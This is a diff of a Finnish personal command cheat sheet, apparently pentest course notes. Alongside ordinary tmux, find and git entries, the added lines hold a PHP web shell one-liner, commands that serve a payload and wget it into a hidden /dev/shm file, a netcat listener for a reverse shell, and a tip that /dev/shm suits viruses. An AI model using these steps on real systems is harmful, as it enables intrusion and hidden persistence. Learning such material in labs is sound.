@@ -198,10 +198,16 @@ ssh -D 2020 nimi@osoite		<--->	SSH proxy yhteys tahan tarvitaan viela firefox as
 nc -vz localhost 9080		<--->	Portin avaus nc=netcat
 Firefox				<--->	Firefox asetuksista manual proxy vain SOCKS host = localhost
 FoxyProxxy			<--->	Jos monta proxya
+
+_____________________________________________________________________________________________________
+** TMUX **
+tmux new -s name		<--->	Aloittaa tmuxin
+CTRL+b	+c			<--->	Prefix
+Prefix+ numero			<--->	vaihtaa sivun
+Prefix+d			<--->	Deletoi ikkunan
 _____________________________________________________________________________________________________
 *** GOOGLE SCHOLAR ***
 settings			<--->	Kieli Englanti, library links Haaga-Helia
-
 _____________________________________________________________________________________________________
 *** KÄYTTÄJÄT *** 
 jhakala tai joni		<--->	Esimerkki käytäjä, max 8merk, a-z, alkaa kirjaimella.
@@ -278,6 +284,7 @@ ________________________________________________________________________________
 **FIND KOMENTO**
 sudo find -printf "%T+ %p\n"|sort			<--->   Kertoo asennetujne ohjelmien ajan jarjesteksyssa
 sudo find -printf '%T+ M %p\n%A+ A %p\n%C+ C %p\n'|sort	<--->	Kertoo asennettujen ohjelmien ajan jarjestyksessa
+find /home -printf "%f\t%p\t%u\t%g\m\n" | column -t	<--->	Hakee home kansion kaikki tiedostot
 _____________________________________________________________________________________________________
 **GIT VERSIO HALLINTA**
 git init nimi                           <--->   Alku kansion luonti paikkallisesti
@@ -366,11 +373,12 @@ censys
 shodan
 maltego
 ________________________________________________________________________________________________
-** Xubuntu pentest alkeet **
-rmmod pcspkr                                    <--->   Piip ääni pois
+** Pentest alkeet **
+rmmod pcspkr                                    <--->   Piip ääni pois kalista
+/dev/shm/.virus.sh				<--->	Hyvä ram kansio viiruksille
 apt-cache search pentest                        <--->   Xubunulla haku
 nmap localhost                                  <--->   Portti scanneri
-nmap -A localhost                               <--->   Banner grab
+nmap -sV localhost                              <--->   Banner grab
 
 virtualenv python3-pip                          <--->   Asennus Xubuntulle
 mkdir mitm
@@ -392,8 +400,8 @@ localhost:8080/WebGoat                          <--->   Selaimella
 echo "salasana"|sha256sum                       <--->   Salasana terminaaliin salattuna sha256
 
 ________________________________________________________________________________________________
-** MitmProxy **https://youtu.be/q1jwwJFpB_A
-EDITOR=nano mitmproxy -p 8888                   <--->   jos portti käytössä
+** MitmProxy **
+EDITOR=nano mitmproxy -p 8888                   <--->   Mitmproxy nano editorilla portissa 8888
 localhost 8888                                  <--->   Manual HTTP proxy Firefox asetus ja 127 poistetaan
 Shift+K                                         <--->   Pika nappainten haku
 m                                               <--->   merkkaa
@@ -405,6 +413,20 @@ m                                               <--->   Voi vaihtaa kieltä sivu
 f                                               <--->   Filter expressions mitmproxy
 i                                               <--->   Intersept=nimi näppäin "a" eteen päin 1askel
 shift+a                                         <--->   Intercept tilassa päästä kaikki loput läpi
+
+________________________________________________________________________________________________
+** Gobuster **
+gobuster -u http://URL -w /usr/share/wordlist	<--->	Dir skannaus
+
+________________________________________________________________________________________________
+** SEARCHSPLOIT **
+uname -a					<--->	Linux versio komento
+searchsploit "app name"				<--->	Hakee tunnetuja haavoituvuuksia
+searchsploit -w "app name"			<--->	Tuo hakuun web sivun
+searchsploit -x id123.txt			<--->	Hakee lisätietoja IDn mukaan
+________________________________________________________________________________________________
+** DIRB skanneri **
+dirb http://10.10.10.1 -r -o			<--->	-r lippu no recursive ja -o tallentaa listan
 
 ________________________________________________________________________________________________
 ** WebGoat **
@@ -540,6 +562,18 @@ set LHOST 127.0.0.1                     <--->
 exploit                                 <--->	
 ./troyan                                <--->	
 fg					<--->	
+
+________________________________________________________________________________________________
+Reverse shell
+<?php echo system($_REQUEST['fun']); ?>	<--->	Koodin toimivuus testi
+?fun=whoami				<--->	Selaimessa tiedoston peraan
+
+python -m SimpleHTTPServer 8000				<--->   Lataus serveri
+wget 10.10.10.10:8000/filename.php -O /dev/shm/.name.php <--->   Tiedoston lataus selaimella
+
+
+nc -v -n -l -p 5005			<--->	Reverse shell omalle koneelle pentestmonkey php
+
 
 
 
